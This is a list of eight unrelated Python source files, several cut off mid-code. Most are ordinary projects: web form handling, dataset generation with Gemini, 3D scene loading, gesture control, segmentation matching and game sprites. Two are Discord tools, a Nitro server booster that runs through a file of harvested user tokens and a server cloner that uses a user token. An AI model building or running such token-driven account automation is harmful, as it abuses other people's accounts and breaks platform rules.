    "\"\"\"\nGNU License\n\nCopyright (c) 2022 DaniDuese\n\n\"\"\"\nfrom ab5 import hgratient\nfrom typing import Optional\nimport colorama\nimport sys\nfrom pystyle import Center, Colorate, Colors, Write\nimport tls_client\nimport os\n\n\ndef setTitle(title: Optional[any] = None):\n  os.system(\"title \"+title)\n\n\nsetTitle(\"BitBoost | Server Booster\")\n\n\ndef clear():\n  if sys.platform in [\"linux\", \"linux2\", \"darwin\"]:\n    os.system(\"clear\")\n  else:\n    os.system(\"cls\")\n\nclear()\n\nsub_ids = []\nlogo = (\"\"\"__________.__  __ __________                       __   \n\\______   \\__|/  |\\______   \\ ____   ____  _______/  |_ \n |    |  _/  \\   __\\    |  _//  _ \\ /  _ \\/  ___/\\   __\\ \n |    |   \\  ||  | |    |   (  <_> |  <_> )___ \\  |  |  \n |______  /__||__| |______  /\\____/ \\____/____  > |__|  \n        \\/                \\/                  \\/        \"\"\")\nbanner = (\"\"\"Please make sure that all your tokens are already in the server you want to boost.\\n\"\"\")\n\nprint(hgratient(logo, [0, 223, 50], [0, 25, 222]))\nprint(banner)\n__guild_id__ = Write.Input(\"Guild ID: \", Colors.blue_to_green, interval=0.05)\ncolorama.init(convert=True)\n\n\nclass Nitro:\n    def __init__(self, token: str):\n        self.token = token\n        self.headers = {\n            \"accept\": \"*/*\",\n            \"accept-encoding\": \"gzip, deflate, br\",\n            \"accept-language\": \"en-US\",\n            \"authorization\": token,\n            \"referer\": \"https://discord.com/channels/@me\",\n            \"sec-fetch-dest\": \"empty\",\n            \"sec-fetch-mode\": \"cors\",\n            \"sec-fetch-site\": \"same-origin\",\n            \"user-agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9007 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36\",\n            \"x-debug-options\": \"bugReporterEnabled\",\n            \"x-discord-locale\": \"en-US\",\n            \"x-super-properties\": \"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDA3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTYxODQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==\"\n        }\n        self.session = tls_client.Session(client_identifier=\"chrome_107\")\n        self.sub_ids = []\n\n    def removeTokenFromTxt(self):\n        with open(\"tokens.txt\", \"r\") as f:\n            lines = f.readlines()\n        with open(\"tokens.txt\", \"w\") as f:\n            for line in lines:\n                if line.strip(\"\\n\") != self.token:\n                    f.write(line)\n\n    def hasNitro(self):\n        sex = self.session.get(\n            \"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots\",\n            headers=self.headers,\n        )\n        if sex.status_code in [403, 401]:\n            return self._extracted_from_hasNitro_7('Token is invalid, removing.')\n        try:\n            for sub in sex.json():\n                self.sub_ids.append(sub[\"id\"])\n        except Exception as e:\n            print(e)\n            print(sex.text)\n        if len(self.sub_ids) == 0:\n            return self._extracted_from_hasNitro_7('Token has no nitro, removing.')\n        log(f\"{colorama.Fore.GREEN}Token has nitro.\")\n        return True\n\n    # TODO Rename this here and in `hasNitro`\n    def _extracted_from_hasNitro_7(self, arg0):\n        log(f\"{colorama.Fore.RED}{arg0}\")\n        self.removeTokenFromTxt()\n        return False\n\n    def boostServer(self, guildID):\n        for i in range(len(self.sub_ids)):\n            self.headers[\"Content-Type\"] = \"application/json\"\n            r = self.session.put(\n                url=f\"https://discord.com/api/v9/guilds/{guildID}/premium/subscriptions\",\n                headers=self.headers,\n                json={\n                    \"user_premium_guild_subscription_slot_ids\": [f\"{self.sub_ids[i]}\"]\n                },\n            )\n            if r.status_code == 201:\n                log(\n                    f\"{colorama.Fore.GREEN}Boosted {i + 1} of {len(sub_ids)} from {self.token[25:]}\"\n                )\n            elif r.status_code == 400:\n                log(\n                    f\"{colorama.Fore.YELLOW}Boost already used {i + 1} of {len(sub_ids)} from {self.token[25:]}\"\n                )\n            else:\n                log(f\"{colorama.Fore.RED}ERROR: {r.status_code}\")\n\n\ndef log(text):\n    print(f\"{text}{colorama.Fore.RESET}\")\n\n\ndef main():\n    with open(\"tokens.txt\", \"r\") as f:\n        tokens = f.read().splitlines()\n    for token in tokens:\n        nitro = Nitro(token)\n        if nitro.hasNitro():\n            nitro.boostServer(__guild_id__)\n\n\nif __name__ == \"__main__\":\n    main()\n    input(\"Press enter to exit.\")\n",
    "from uuid import uuid4\n\nfrom werkzeug.wrappers import Response\nfrom http import HTTPStatus\n\nfrom lxml.html.builder import E as e\nfrom lxml import html\n\n\ndef get(request):\n    base_id = str(uuid4())\n\n    form = e.div(\n        e.form(\n            e.div(\n                e.label(\"Name\", **{\"class\": \"label\"}),\n                e.div(\n                    e.input(\n                        **{\n                            \"type\": \"text\",\n                            \"name\": \"name\",\n                            \"required\": \"true\",\n                            \"class\": \"input is-radiusless\",\n                        }\n                    ),\n                    **{\"class\": \"control\"},\n                ),\n                **{\"class\": \"field\"},\n            ),\n            e.div(\n                e.div(\n                    e.button(\n                        \"Submit\",\n                        **{\n                            \"class\": \"button is-link is-radiusless\",\n                            \"type\": \"submit\",\n                        },\n                    ),\n                    **{\"class\": \"control\"},\n                ),\n                **{\"class\": \"field\"},\n            ),\n            **{\n                \"hx-post\": request.path,\n                \"hx-trigger\": \"submit\",\n                \"hx-target\": f\"#form-{base_id}-result\",\n                \"hx-indicator\": f\"#form-{base_id}-indicator\",\n            },\n        ),\n        e.div(\n            e.div(\n                **{\n                    \"id\": f\"form-{base_id}-indicator\",\n                    \"class\": \"htmx-indicator\",\n                },\n            ),\n            **{\"id\": f\"form-{base_id}-result\"},\n        ),\n    )\n\n    return Response(\n        html.tostring(form),\n        status=HTTPStatus.OK,\n        content_type=\"text/html; charset=utf-8\",\n    )\n\n\ndef post(app, request):\n    name = request.form.get(\"name\", \"Anonymous\")\n    body = e.p(f\"Hello, {name}!\")\n    return Response(\n        html.tostring(body),\n        status=HTTPStatus.OK,\n        content_type=\"text/html; charset=utf-8\",\n    )\n",
    "import os\nimport re\nimport threading\nimport time\nfrom typing import List, Tuple\nfrom PIL import Image\n\nimport google.generativeai as genai\nimport tqdm\n\nfrom utils import load_from_jsonl, append_to_jsonl\n\nDATA_DIR = './'\nAPI_KEY = 'your_api_key'\n\n\ndef generate_docvqa(model: genai.GenerativeModel, image: Image.Image, QAs: List[Tuple[str, str]]):\n    prompt = \\\n\"\"\"You are a document processing specialist. Based on the document scan image and question-answer pairs, help me finish the following jobs:\n\n1. Write a brief description about the topic and key points of the document.\n2. From the example question, get the thinking process of the example answer.\n3. Imitate the example question-thought-answer tuples and generate 10 more question-thought-answer tuples. Keep the generated answer concise, i.e., using a single word or phrase.\n\nYour output should follow this format, ${...} means the filling content:\n\nCaption: ${brief_description}\n\"\"\"\n\n    for idx, (question, answer) in enumerate(QAs):\n        prompt += \\\nf\"\"\"\nExample {idx + 1}:\nQ: {question}\nT: ${{thought}}\nA: {answer}\n\"\"\"\n\n    prompt += \\\n\"\"\"\nGenerated 1:\nQ: ${question}\nT: ${thought}\nA: ${answer}\n\nGenerated ...\"\"\"\n\n    response = model.generate_content([image, prompt])\n\n    return response.text\n\n\ndef generate_chartqa(model: genai.GenerativeModel, image: Image.Image, QAs: List[Tuple[str, str]]):\n    prompt = \\\n\"\"\"You are a data analyst. Based on the chart image and question-answer pairs, help me finish the following jobs:\n\n1. Write a brief description about the topic and key points of the chart.\n2. Restore the data table corresponding to the chart.\n3. From the example question, get the thinking process of the example answer.\n4. Imitate the example question-thought-answer tuples and generate 5 more question-thought-answer tuples. Keep the generated answer concise, i.e., using a single word or phrase.\n\nYour output should follow this format, ${...} means the filling content:\n\nCaption: ${brief_description}\n\nData: ${data_table}\n\"\"\"\n\n    for idx, (question, answer) in enumerate(QAs):\n        prompt += \\\nf\"\"\"\nExample {idx + 1}:\nQ: {question}\nT: ${{thought}}\nA: {answer}\n\"\"\"\n\n    prompt += \\\n\"\"\"\nGenerated 1:\nQ: ${question}\nT: ${thought}\nA: ${answer}\n\nGenerated ...\"\"\"\n\n    response = model.generate_content([image, prompt])\n\n    return response.text\n\n\ndef generate_infovqa(model: genai.GenerativeModel, image: Image.Image, QAs: List[Tuple[str, str]]):\n    w, h = image.size\n    if w > 3072:\n        w = 3072\n        h = int(h / w * 3072)\n        image = image.resize((3072, h), resample=Image.Resampling.BICUBIC)\n    crops = []\n    crop_hint = ''\n    if h > 3072:\n        for y in range(0, h, 3072):\n            if h - y >= 3072:\n                crop = image.crop((0, y, w, y + 3072))\n            else:\n                crop = Image.new('RGB', (w, 3072))\n                crop.paste(image.crop((0, y, w, h)))\n            crops.append(crop)\n        crop_hint = f' (the whole image is vertically splitted into {len(crops)} sub-images)'\n\n    prompt = \\\nf\"\"\"You are a professional researcher. Based on the infographic image{crop_hint} and question-answer pairs, help me finish the following jobs:\n\n1. Write a brief description about the topic and key points of the infographic.\n2. From the example question, get the thinking process of the example answer.\n3. Imitate the example question-thought-answer tuples and generate 10 more question-thought-answer tuples. Keep the generated answer concise, i.e., using a single word or phrase.\n\nYour output should follow this format, ${{...}} means the filling content:\n\nCaption: ${{brief_description}}\n\"\"\"\n\n    for idx, (question, answer) in enumerate(QAs):\n        prompt += \\\nf\"\"\"\nExample {idx + 1}:\nQ: {question}\nT: ${{thought}}\nA: {answer}\n\"\"\"\n\n    prompt += \\\n\"\"\"\nGenerated 1:\nQ: ${question}\nT: ${thought}\nA: ${answer}\n\nGenerated ...\"\"\"\n\n    if crops:\n        response = model.generate_content([*crops, prompt])\n    else:\n        response = model.generate_content([image, prompt])\n\n    return response.text\n\n\ndef get_structured_extension(text):\n    structured_data = {}\n\n    caption_match = re.search(r'Caption:(.+?)\\n\\n', text, re.DOTALL)\n    structured_data['caption'] = caption_match.group(1).strip()\n\n    data_match = re.search(r'Data:\\n\\n(.+?)\\n\\n', text, re.DOTALL)\n    if data_match:\n        structured_data['data'] = data_match.group(1).strip()\n\n    example_matches = re.findall(r'Example \\d:\\nQ:(.+?)\\nT:(.+?)\\nA:(.+?)\\n\\n', text, re.DOTALL)\n    structured_data['example'] = []\n    for m in example_matches:\n        structured_data['example'].append({\n            'question': m[0].strip(),\n            'thought': m[1].strip(),\n            'answer': m[2].strip(),\n        })\n    assert len(structured_data['example']) > 0\n\n    generated_matches = re.findall(r'Generated \\d:\\nQ:(.+?)\\nT:(.+?)\\nA:(.+?)(?=\\n\\n|\\Z)', text, re.DOTALL)\n    structured_data['generated'] = []\n    for m in generated_matches:\n        structured_data['generated'].append({\n            'question': m[0",
    "from httpx import Client\nfrom base64 import b64encode\nfrom time import sleep\nfrom colorama import Fore, Back, Style, init\nfrom time import strftime\nfrom json import loads, JSONDecodeError\nimport time\nimport os\n\n\n\n\ninit(autoreset=True)\n\ndef p(text: str) -> None:\n    print(\n        f\"{Fore.LIGHTWHITE_EX}[{Fore.CYAN}{strftime('%H:%M:%S')}{Fore.LIGHTWHITE_EX}] {text}\"\n        .replace('[+]', f'[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTWHITE_EX}]')\n        .replace('[*]', f'[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}]')\n        .replace('[>]', f'[{Fore.CYAN}>{Fore.LIGHTWHITE_EX}]')\n        .replace('[-]', f'[{Fore.RED}-{Fore.LIGHTWHITE_EX}]')\n    )\n\nclass Scrape:\n    def __init__(self, token: str, id: str) -> None:\n        self.token      = token\n        self.id         = id\n        self.baseurl    = f\"https://discord.com/api/v9/guilds/{self.id}\"\n        self.session    = Client()\n        self.headers    = {\"Authorization\": self.token}\n\n    def do_request(self, url) -> dict:\n        return self.session.get(\n            url = url,\n            headers = self.headers,\n        ).json()\n\n    def get_channels(self) -> dict:\n        return self.do_request(f\"{self.baseurl}/channels\")\n\n    def get_info(self) -> dict:\n        return self.do_request(self.baseurl)\n\n    def get_data(self) -> dict:\n        info = self.get_info()\n        channels = self.get_channels()\n\n        return {\n            \"info\"      : info,\n            \"channels\"  : channels,\n            \"roles\"     : info.get(\"roles\", []),\n            \"emojis\"    : info.get(\"emojis\", []),\n        }\n\nclass Create:\n    def __init__(self, token: str, data: dict) -> None:\n        self.token      = token\n        self.baseurl    = \"https://discord.com/api/v9\"\n        self.session    = Client()\n        self.data       = data\n        self.headers    = {\"Authorization\": self.token}\n        self.delay      = 0.5  # I wouldn't change this \n\n    def create_server(self):\n        p(\"[>] Creating server\")\n        img = f\"https://cdn.discordapp.com/icons/{self.data['info']['id']}/{self.data['info']['icon']}.webp?size=96\"\n        img = f\"data:image/png;base64,{b64encode(self.session.get(img).content).decode('utf-8')}\"\n        data = {\n            \"name\"                  : self.data[\"info\"][\"name\"],\n            \"icon\"                  : img,\n            \"channels\"              : [],\n            \"system_channel_id\"     : None,\n            \"guild_template_code\"   : \"8ewECn5UKpDY\",\n        }\n\n        res = self.session.post(\n            url     = f\"{self.baseurl}/guilds\",\n            headers = self.headers,\n            json    = data,\n        ).json()\n\n        print(res)  # Added row\n\n        self.id         = res[\"id\"]\n        self.everyone   = res[\"roles\"][0][\"id\"]\n        url             = f\"{self.baseurl}/guilds/{self.id}/roles/{self.everyone}\"\n        data            = {\n            \"name\"          : \"@everyone\",\n            \"permissions\"   : \"1071698529857\",\n            \"color\"         : 0,\n            \"hoist\"         : False,\n            \"mentionable\"   : False,\n            \"icon\"          : None,\n            \"unicode_emoji\" : None,\n        }\n        self.session.patch(\n            url     = url,\n            headers = self.headers,\n            json    = data,\n        )\n\n        url     = f\"{self.baseurl}/guilds/{self.id}\"\n        data    = {\n            \"features\"                      : [\"APPLICATION_COMMAND_PERMISSIONS_V2\", \"COMMUNITY\"],\n            \"verification_level\"            : 1,\n            \"default_message_notifications\" : 1,\n            \"explicit_content_filter\"       : 2,\n            \"rules_channel_id\"              : \"1\",\n            \"public_updates_channel_id\"     : \"1\",\n        }\n        self.session.patch(\n            url     = url,\n            headers = self.headers,\n            json    = data,\n        )\n\n        p(f\"[+] Created server {self.data['info']['name']} -> {res['id']}\")\n\n    def delete_channels(self):\n        channels = self.session.get(\n            url=f\"{self.baseurl}/guilds/{self.id}/channels\",\n            headers=self.headers,\n        ).json()\n\n        for channel in channels:\n            s = self.session.delete(\n                url=f\"{self.baseurl}/channels/{channel['id']}\",\n                headers=self.headers,\n            ).status_code\n\n            p(f\"[+] Deleted channel {channel['name']} -> {s}\" if s == 200 else f\"[-] Failed to delete channel {channel['name']} -> {s}\")\n\n    def create_channels(self):\n        parentchannels = sorted([channel for channel in self.data[\"channels\"] if channel[\"type\"] == 4] , key=lambda x: x[\"position\"])\n        prnt = {}\n\n        p(f\"[>] Creating {len(parentchannels)} parent channels\")\n\n        for channel in parentchannels:\n            data = {\n                \"name\"                  : channel[\"name\"],\n                \"type\"                  : channel[\"type\"],\n                \"permission_overwrites\" : channel[\"permission_overwrites\"],\n            }\n\n            res = self.session.post(\n                url     = f\"{self.baseur",
    "#\n# Copyright (C) 2023, Inria\n# GRAPHDECO research group, https://team.inria.fr/graphdeco\n# All rights reserved.\n#\n# This software is free for non-commercial, research and evaluation use \n# under the terms of the LICENSE.md file.\n#\n# For inquiries contact  george.drettakis@inria.fr\n#\n\nimport os\nimport random\nimport json\nfrom utils.system_utils import searchForMaxIteration\nfrom scene.gaussian_model import GaussianModel\nfrom arguments import ModelParams\nfrom gaustudio import datasets\n\nclass Scene:\n\n    gaussians : GaussianModel\n\n    def __init__(self, args : ModelParams, gaussians : GaussianModel, load_iteration=None, shuffle=True, resolution_scales=[1.0]):\n        \"\"\"b\n        :param path: Path to colmap scene main folder.\n        \"\"\"\n        self.model_path = args.model_path\n        self.loaded_iter = None\n        self.gaussians = gaussians\n\n        if load_iteration:\n            if load_iteration == -1:\n                self.loaded_iter = searchForMaxIteration(os.path.join(self.model_path, \"point_cloud\"))\n            else:\n                self.loaded_iter = load_iteration\n            print(\"Loading trained model at iteration {}\".format(self.loaded_iter))\n        \n        self.train_cameras = {}\n        self.test_cameras = {}\n        \n        # Initialize dataset with gaustudio.datasets\n        _dataset = datasets.make({\"name\": args.dataset, \"source_path\": args.source_path, \\\n                                            \"images\": args.images,\n                                            'w_mask': args.w_mask,\n                                            \"resolution\":resolution_scales[0], \"data_device\":\"cuda\", \\\n                                            \"eval\": False})\n        _dataset.export(os.path.join(self.model_path, \"cameras.json\"))\n        print(\"Loading Training Cameras\")\n        self.train_cameras[resolution_scales[0]] = _dataset.all_cameras\n        print(\"Loading Test Cameras\")\n        self.test_cameras[resolution_scales[0]] = []\n        self.cameras_extent = _dataset.cameras_extent\n\n        if self.loaded_iter:\n            self.gaussians.load_ply(os.path.join(self.model_path,\n                                                           \"point_cloud\",\n                                                           \"iteration_\" + str(self.loaded_iter),\n                                                           \"point_cloud.ply\"))\n        else:\n            # Initialize pcd with gaustudio.initializers\n            from gaustudio.pipelines import initializers\n            from gaustudio import models\n            pcd = models.make(\"general_pcd\")\n            initializer_config = {\"name\":'colmap', \"workspace_dir\":args.source_path}\n            initializer = initializers.make(initializer_config)\n            initializer(pcd, _dataset, overwrite=False)\n            self.gaussians.create_from_pcd(pcd, self.cameras_extent)\n\n    def save(self, iteration):\n        point_cloud_path = os.path.join(self.model_path, \"point_cloud/iteration_{}\".format(iteration))\n        self.gaussians.save_ply(os.path.join(point_cloud_path, \"point_cloud.ply\"))\n\n    def getTrainCameras(self, scale=1.0):\n        return self.train_cameras[scale]\n\n    def getTestCameras(self, scale=1.0):\n        return self.test_cameras[scale]",
    "import gi\ngi.require_version('Gtk', '3.0')\nfrom gi.repository import Gtk, GdkPixbuf, Gdk, GLib\nimport cv2\nimport numpy as np\nimport mediapipe as mp\nfrom keras.models import load_model\nimport threading\nimport os\nimport json\nimport time\n\nclass_names = ['okay', 'peace', 'thumbs up', 'thumbs down', 'call me', 'stop', 'rock', 'live long', 'fist', 'smile']\n\ngesture_commands = {\n    'okay': 'true',\n    'peace': 'true',\n    'thumbs up': 'true',\n    'thumbs down': 'true',\n    'call me': 'true',\n    'stop': 'true',\n    'rock': 'true',\n    'fist': 'true',\n    'smile': 'true',\n    'live long': 'true'\n}\n\nicons = {\n    'okay': '\ud83d\udc4c',\n    'peace': '\u270c\ufe0f',\n    'thumbs up': '\ud83d\udc4d',\n    'thumbs down': '\ud83d\udc4e',\n    'call me': '\ud83e\udd19',\n    'stop': '\u270b',\n    'rock': '\ud83e\udd1f',\n    'fist': '\u270a',\n    'smile': '\ud83d\udc49',\n    'live long': '\ud83d\udd96'\n}\n\nclass Main(Gtk.Window):\n    def __init__(self):\n        Gtk.Window.__init__(self, title=\"GestureX\")\n        self.set_border_width(10)\n\n        self.grid = Gtk.Grid()\n        self.grid.set_column_spacing(6)\n        self.grid.set_row_spacing(10)\n        self.add(self.grid)\n\n        # Add title for command binding section\n        command_title_label = Gtk.Label()\n        command_title_label.set_markup('<span size=\"larger\" weight=\"bold\">Command Binding</span>')\n        self.grid.attach(command_title_label, 0, 0, 2, 1)\n\n        self.text_entries = {}\n\n        for i, label in enumerate(class_names):\n            label_widget = Gtk.Label()\n            label_widget.set_markup('<span size=\"xx-large\">' + icons[label] + '</span>')\n            textbox = Gtk.Entry()\n            textbox.set_width_chars(30)\n            textbox.set_placeholder_text(\"Command\")\n            textbox.set_tooltip_text(\"Enter the command to execute for this gesture. Hint: Can concatenate multiple commands with '&&'\")\n\n            label_widget.set_mnemonic_widget(textbox)\n\n            self.grid.attach(label_widget, 0, i+1, 1, 1)\n            self.grid.attach_next_to(textbox, label_widget, Gtk.PositionType.RIGHT, 1, 1)\n            self.text_entries[label] = textbox\n\n        # Create a separate row for buttons\n        button_row = Gtk.Grid()\n        button_row.set_column_spacing(6)\n        self.grid.attach(button_row, 0, len(class_names) + 1, 2, 1)\n\n        # Add \"Save\" button\n        save_btn = Gtk.Button(label=\"Save\")\n        save_btn.set_hexpand(True)\n        button_row.attach(save_btn, 0, 0, 1, 1)\n        save_btn.connect(\"clicked\", self.on_save_clicked)\n        save_btn.set_tooltip_text(\"Save the gesture commands in the program\")\n        save_btn.connect(\"clicked\", self.show_confirmation_message, \"Commands saved successfully!\")\n\n        # Add \"Export\" button\n        export_btn = Gtk.Button(label=\"Export\")\n        export_btn.set_hexpand(True)\n        button_row.attach_next_to(export_btn, save_btn, Gtk.PositionType.RIGHT, 1, 1)\n        export_btn.set_tooltip_text(\"Export gesture commands into json file\")\n        export_btn.connect(\"clicked\", self.on_export_clicked)\n\n        # Add \"Import\" button\n        import_btn = Gtk.Button(label=\"Import\")\n        import_btn.set_hexpand(True)\n        button_row.attach_next_to(import_btn, export_btn, Gtk.PositionType.RIGHT, 1, 1)\n        import_btn.set_tooltip_text(\"Import gesture commands from json file\")\n        import_btn.connect(\"clicked\", self.on_import_clicked)\n\n        # Create a separator between command binding section and CV2 preview\n        separator = Gtk.Separator(orientation=Gtk.Orientation.VERTICAL)\n        separator.override_color(Gtk.StateFlags.NORMAL, Gdk.RGBA(0, 0, 0, 1))\n        separator.set_size_request(2, -1)\n        separator.set_margin_top(10)\n\n        self.grid.set_column_spacing(20)\n        self.grid.attach(separator, 2, 0, 1, len(class_names) + 2)\n\n        # Add title for CV2 preview section\n        preview_title_label = Gtk.Label()\n        preview_title_label.set_markup('<span size=\"large\" weight=\"bold\">Preview</span>')\n        self.grid.attach(preview_title_label, 3, 0, 1, 1)\n\n        # Create a widget for displaying the video\n        self.video_widget = Gtk.Image()\n        self.grid.attach(self.video_widget, 3, 0, 1, len(class_names))\n        self.video_widget.set_tooltip_text(\"Live video preview\")\n\n        controls_row = Gtk.Grid()\n        controls_row.set_column_spacing(6)\n        self.grid.attach(controls_row, 3, len(class_names), 1, 1)\n\n        # Camera source button\n        camera_sources = self.get_camera_sources()\n        self.camera_source_combo = Gtk.ComboBoxText()\n        for source in camera_sources:\n            self.camera_source_combo.append_text(f\"Camera {source}\")\n        self.camera_source_combo.set_active(0)  # Set default selection\n        self.camera_source_combo.set_tooltip_text(\"Select the camera source\")\n        controls_row.attach(self.camera_source_combo, 0, 0, 1, 1)\n\n        # Create cooldown change textbox\n        self.cooldown_textbox = Gtk.Entry()\n        self.cooldown_textbox.set_width_chars(15)\n        self.cooldown_textbox.set_placeholder_text(\"Gesture Cooldown (s",
    "# Reference: https://github.com/facebookresearch/Mask2Former/blob/main/mask2former/modeling/matcher.py\n# Reference: https://github.com/google-research/deeplab2/blob/main/model/loss/max_deeplab_loss.py\n# Modified by Qihang Yu\n\n\"\"\"\nModules to compute the matching cost and solve the corresponding LSAP.\n\"\"\"\nimport torch\nimport torch.nn.functional as F\nfrom scipy.optimize import linear_sum_assignment\nfrom torch import nn\nfrom torch.cuda.amp import autocast\nimport numpy as np\n\n\n# https://github.com/google-research/deeplab2/blob/c4a533c14fac1a1071a6d24c5379c31a69a3e5e6/model/loss/max_deeplab_loss.py#L158\n@torch.no_grad()\ndef compute_mask_similarity(inputs: torch.Tensor, targets: torch.Tensor):\n    \"\"\"\n    Compute the DICE loss, similar to generalized IOU for masks\n    Args:\n        inputs: A float tensor of arbitrary shape.\n                The predictions for each example.\n        targets: A float tensor with the same shape as inputs. Stores the binary\n                 classification label for each element in inputs\n                (0 for the negative class and 1 for the positive class).\n    \"\"\"\n    denominator_epsilon = 1e-5\n    inputs = F.softmax(inputs, dim=0)\n    inputs = inputs.flatten(1) # N x HW\n\n    pixel_gt_non_void_mask = (targets.sum(0, keepdim=True) > 0).to(inputs) # 1xHW\n    inputs = inputs * pixel_gt_non_void_mask\n\n    intersection = torch.einsum(\"nc,mc->nm\", inputs, targets)\n    denominator = (inputs.sum(-1)[:, None] + targets.sum(-1)[None, :]) / 2.0\n    return intersection / (denominator + denominator_epsilon)\n\n\n# https://github.com/google-research/deeplab2/blob/c4a533c14fac1a1071a6d24c5379c31a69a3e5e6/model/loss/max_deeplab_loss.py#L941\n@torch.no_grad()\ndef compute_class_similarity(inputs: torch.Tensor, targets: torch.Tensor):\n    pred_class_prob = inputs.softmax(-1)[..., :-1] # exclude the void class\n    return pred_class_prob[:, targets]\n\n\nclass HungarianMatcher(nn.Module):\n    \"\"\"This class computes an assignment between the targets and the predictions of the network\n\n    For efficiency reasons, the targets don't include the no_object. Because of this, in general,\n    there are more predictions than targets. In this case, we do a 1-to-1 matching of the best predictions,\n    while the others are un-matched (and thus treated as non-objects).\n    \"\"\"\n\n    def __init__(self):\n        \"\"\"Creates the matcher\n\n        Params:\n            cost_class: This is the relative weight of the classification error in the matching cost\n            cost_mask: This is the relative weight of the focal loss of the binary mask in the matching cost\n            cost_dice: This is the relative weight of the dice loss of the binary mask in the matching cost\n        \"\"\"\n        super().__init__()\n\n    @torch.no_grad()\n    def memory_efficient_forward(self, outputs, targets):\n        \"\"\"More memory-friendly matching\"\"\"\n        bs, num_queries = outputs[\"pred_logits\"].shape[:2]\n\n        indices = []\n        matched_dice = []\n        matched_cls_prob = []\n        # Iterate through batch size\n        for b in range(bs):\n            with autocast(enabled=False):\n                class_similarity = compute_class_similarity(outputs[\"pred_logits\"][b].float(), targets[b][\"labels\"])\n            out_mask = outputs[\"pred_masks\"][b].flatten(1)  # [num_queries, H_pred, W_pred]\n            # gt masks are already padded when preparing target\n            tgt_mask = targets[b][\"masks\"].to(out_mask).flatten(1)\n            with autocast(enabled=False):\n                mask_similarity = compute_mask_similarity(out_mask.float(), tgt_mask.float())\n            \n            # Final cost matrix\n            C = - mask_similarity * class_similarity\n            C = C.reshape(num_queries, -1).cpu() # N x M , N = num_queries, M = num_gt\n\n            # the assignment will be truncated to a square matrix.\n            row_ind, col_ind = linear_sum_assignment(C)\n            matched_dice.append(mask_similarity[row_ind, col_ind].detach())\n            matched_cls_prob.append(class_similarity[row_ind, col_ind].detach())\n            indices.append((row_ind, col_ind)) # row_ind and col_ind, row_ind = 0,1,2,3,...,N-1, col_ind = a,b,c,d,...\n\n        indices = [\n            (torch.as_tensor(i, dtype=torch.int64), torch.as_tensor(j, dtype=torch.int64))\n            for i, j in indices\n        ]\n        \n        return indices, matched_dice, matched_cls_prob\n    \n\n    @torch.no_grad()\n    def forward(self, outputs, targets):\n        \"\"\"Performs the matching\n\n        Params:\n            outputs: This is a dict that contains at least these entries:\n                 \"pred_logits\": Tensor of dim [batch_size, num_queries, num_classes] with the classification logits\n                 \"pred_masks\": Tensor of dim [batch_size, num_queries, H_pred, W_pred] with the predicted masks\n\n            targets: This is a list of targets (len(targets) = batch_size), where each target is a dict containing:\n                 \"labels\": Tensor of dim [num_target_boxes] (where num_target_boxes i",
    "from settings import * \r\nfrom random import uniform\r\nfrom support import draw_bar\r\nfrom timer import Timer\r\n\r\n# overworld sprites\r\nclass Sprite(pygame.sprite.Sprite):\r\n\tdef __init__(self, pos, surf, groups, z = WORLD_LAYERS['main']):\r\n\t\tsuper().__init__(groups)\r\n\t\tself.image = surf \r\n\t\tself.rect = self.image.get_frect(topleft = pos)\r\n\t\tself.z = z\r\n\t\tself.y_sort = self.rect.centery\r\n\t\tself.hitbox = self.rect.copy()\r\n\r\nclass BorderSprite(Sprite):\r\n\tdef __init__(self, pos, surf, groups):\r\n\t\tsuper().__init__(pos, surf, groups)\r\n\t\tself.hitbox = self.rect.copy()\r\n\r\nclass TransitionSprite(Sprite):\r\n\tdef __init__(self, pos, size, target, groups):\r\n\t\tsurf = pygame.Surface(size)\r\n\t\tsuper().__init__(pos, surf, groups)\r\n\t\tself.target = target\r\n\r\nclass CollidableSprite(Sprite):\r\n\tdef __init__(self, pos, surf, groups):\r\n\t\tsuper().__init__(pos, surf, groups)\r\n\t\tself.hitbox = self.rect.inflate(0, -self.rect.height * 0.6)\r\n\r\nclass MonsterPatchSprite(Sprite):\r\n\tdef __init__(self, pos, surf, groups, biome, monsters, level):\r\n\t\tself.biome = biome\r\n\t\tsuper().__init__(pos, surf, groups, WORLD_LAYERS['main' if biome != 'sand' else 'bg'])\r\n\t\tself.y_sort -= 40\r\n\t\tself.biome = biome\r\n\t\tself.monsters = monsters.split(',')\r\n\t\tself.level = level\r\n\r\nclass AnimatedSprite(Sprite):\r\n\tdef __init__(self, pos, frames, groups, z = WORLD_LAYERS['main']):\r\n\t\tself.frame_index, self.frames = 0, frames\r\n\t\tsuper().__init__(pos, frames[self.frame_index], groups, z)\r\n\r\n\tdef animate(self, dt):\r\n\t\tself.frame_index += ANIMATION_SPEED * dt\r\n\t\tself.image = self.frames[int(self.frame_index % len(self.frames))]\r\n\r\n\tdef update(self, dt):\r\n\t\tself.animate(dt)\r\n\r\n# battle sprites \r\nclass MonsterSprite(pygame.sprite.Sprite):\r\n\tdef __init__(self, pos, frames, groups, monster, index, pos_index, entity, apply_attack, create_monster):\r\n\t\t# data\r\n\t\tself.index = index \r\n\t\tself.pos_index = pos_index\r\n\t\tself.entity = entity\r\n\t\tself.monster = monster\r\n\t\tself.frame_index, self.frames, self.state = 0, frames, 'idle'\r\n\t\tself.animation_speed = ANIMATION_SPEED + uniform(-1, 1)\r\n\t\tself.z = BATTLE_LAYERS['monster']\r\n\t\tself.highlight = False\r\n\t\tself.target_sprite = None\r\n\t\tself.current_attack = None\r\n\t\tself.apply_attack = apply_attack\r\n\t\tself.create_monster = create_monster\r\n\r\n\t\t# sprite setup\r\n\t\tsuper().__init__(groups)\r\n\t\tself.image = self.frames[self.state][self.frame_index]\r\n\t\tself.rect = self.image.get_frect(center = pos)\r\n\r\n\t\t# timers \r\n\t\tself.timers = {\r\n\t\t\t'remove highlight': Timer(300, func 